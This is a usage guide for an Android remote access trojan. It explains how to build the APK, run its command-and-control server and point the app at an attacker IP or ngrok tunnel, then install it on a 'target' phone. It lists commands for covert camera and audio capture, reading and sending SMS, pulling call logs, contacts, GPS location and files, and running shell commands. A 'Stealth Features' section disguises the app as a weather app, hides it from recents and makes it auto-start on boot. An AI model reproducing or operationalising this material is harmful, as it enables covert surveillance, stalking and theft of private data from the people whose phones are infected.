# Android RAT - Complete Usage Guide

## 📋 Table of Contents
1. [Setup](#setup)
2. [Building the APK](#building-the-apk)
3. [Starting the Server](#starting-the-server)
4. [Installing on Target](#installing-on-target)
5. [Available Commands](#available-commands)
6. [Accessing Data](#accessing-data)

---

## Setup

### Prerequisites
- Python 3.8+
- Android Studio (for building)
- JDK 11+

### Install Dependencies
```bash
cd android-rat
pip3 install -r requirements.txt
```

---

## Building the APK

### Option 1: Using Android Studio
1. Open the `android-rat` folder in Android Studio
2. Wait for Gradle sync to complete
3. Go to **Build > Build Bundle(s) / APK(s) > Build APK(s)**
4. APK will be at: `app/build/outputs/apk/release/app-release.apk`

### Option 2: Using Command Line
```bash
# Using Gradle wrapper
./gradlew assembleRelease

# Or using build script
./build.sh
```

### Option 3: Online Compiler (No Android Studio)
1. Visit: https://www.onlinegdb.com/online_java_compiler
2. Or use: https://replit.com/@templates/android
3. Upload all project files
4. Build APK

---

## Starting the Server

```bash
# Update with your server IP
./quickstart.sh

# Start the C2 server
python3 server.py
```

The server will start at `http://0.0.0.0:5000`

### Configure Server IP
Edit `MainActivity.java` line 30:
```java
private static final String SERVER_URL = "http://YOUR_IP:5000";
```

For remote access:
- Use your public IP
- Port forward 5000 on your router
- Or use ngrok: `ngrok http 5000`

---

## Installing on Target

### Method 1: ADB
```bash
adb install android-rat.apk
```

### Method 2: Direct Transfer
1. Transfer APK to target device
2. Enable "Install from Unknown Sources"
3. Open and install the APK

### Method 3: Email/Cloud
1. Email the APK to yourself
2. Or upload to Google Drive
3. Download and install on target

---

## Available Commands

### 📷 Camera
```
Take Photo: action = "camera"
Record Video: action = "camera_video"
```

### 📞 Call Logs
```
Get Call Logs: action = "call_logs"
```

### 📁 File System
```
List Files: action = "files", param = "/path/to/list"
Download File: action = "download", param = "/path/to/file"
```

### 📍 Location
```
Get GPS: action = "location"
```

### 📨 SMS
```
Read SMS: action = "sms"
Send SMS: action = "sms_send", param = "number,message"
```

### 👥 Contacts
```
Get Contacts: action = "contacts"
```

### 🎤 Audio
```
Record Audio: action = "audio", param = duration_in_seconds
```

### ℹ️ Device Info
```
Get Info: action = "info"
```

### 🔧 Shell Commands (Root Required)
```
Execute: action = "shell", param = "command"
```

---

## Accessing Data

### Web Dashboard
Open: `http://localhost:5000`

Features:
- View connected devices
- Send commands
- Download photos/audio
- View call logs
- Browse file system
- Track location

### API Endpoints
```
GET  /api/devices          - List all devices
GET  /api/device/<id>      - Get device data
POST /api/command          - Send command
GET  /api/download/photo/<id>/<filename>
GET  /api/download/audio/<id>/<filename>
GET  /api/download/file/<id>/<filename>
```

### Download Files
Files are stored in:
```
uploads/
├── photos/<device_id>/
├── audio/<device_id>/
└── files/<device_id>/
```

---

## Stealth Features

### Hidden Icon
The app disguises as "Weather" app

### Background Service
Runs as foreground service with minimal notification

### Auto-start
Starts automatically on boot

### No Recents
Hidden from recent apps list

---

## Permissions Required

| Permission | Purpose |
|------------|---------|
| CAMERA | Take photos/videos |
| RECORD_AUDIO | Record audio |
| READ_CALL_LOG | Access call history |
| READ_EXTERNAL_STORAGE | Browse files |
| ACCESS_FINE_LOCATION | GPS tracking |
| READ_PHONE_STATE | Get device info |
| READ_SMS | Read messages |
| RECEIVE_BOOT_COMPLETED | Auto-start on boot |

---

## Troubleshooting

### Device not showing up
1. Check server IP in MainActivity.java
2. Verify device has internet
3. Check firewall allows port 5000
4. Verify CORS is enabled

### Commands not executing
1. Check device is online (< 60 seconds)
2. Verify all permissions granted
3. Check server logs

### APK won't install
1. Enable "Unknown Sources"
2. Check Android version (min SDK 21)
3. Try signing the APK

---

## Example Workflow

```bash
# 1. Start server
python3 server.py

# 2. In another terminal, build APK
./build.sh

# 3. Install on device
adb install android-rat.apk

# 4. Open dashboard
http://localhost:5000

# 5. Select device and send commands
```

---

## Security Notes

- Use HTTPS in production
- Add authentication to server
- Encrypt sensitive data
- Change app package name
- Obfuscate code with ProGuard
